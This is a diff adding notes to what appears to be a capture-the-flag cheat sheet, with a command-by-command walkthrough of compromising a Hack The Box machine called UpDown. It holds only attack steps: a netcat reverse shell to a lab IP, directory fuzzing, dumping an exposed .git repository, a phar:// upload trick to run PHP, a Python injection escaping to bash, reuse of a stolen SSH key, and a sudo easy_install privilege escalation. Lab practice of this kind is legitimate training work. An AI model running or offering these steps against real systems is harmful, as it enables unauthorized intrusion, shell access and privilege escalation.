@@ -195,4 +195,39 @@ ssh mindy@10.10.10.51 -t bash
 nc -e /bin/sh 10.10.14.7 4444
 ```
 
-
+# Lin-UpDown
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.177
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.177/FUZZ -fs 277 -e .aspx,.php,.txt,.html,.sh
+gobuster dir -u 10.10.11.177 -w /usr/share/dirb/wordlists/common.txt
+gobuster dir -u http://10.10.11.177/dev/ -w /usr/share/dirb/wordlists/common.txt
+http://10.10.11.177/
+http://10.10.11.177/dev/
+http://10.10.11.177/dev/.git/
+pip install git-dumper
+git-dumper http://10.10.11.177/dev/.git /home/itsec/Documents/HTB-UpDown/dev/
+git log
+Proxy – Match and replace rules
+http://dev.siteisup.htb/
+echo "<?php phpinfo(); ?>" > info.php
+zip info.zip info.php
+mv info.zip info.txt
+http://dev.siteisup.htb/uploads/
+http://dev.siteisup.htb/?page=phar://uploads/81d6840826b9f6ab35021cfbc006b9be/info.txt/info
+https://github.com/teambi0s/dfunc-bypasser
+./dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/e744af4911ee9e365e53bebef0ee2496/info.txt/info'
+nano rev.php
+zip rev.zip rev.php
+mv rev.zip rev.txt
+cd /home/developer/dev
+./siteisup
+__import__('os').system('/bin/bash')
+cd .ssh
+chmod 600 id_rsa
+ssh -i id_rsa developer@10.10.11.177
+sudo –l
+https://gtfobins.github.io/gtfobins/easy_install/
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo easy_install $TF
+```
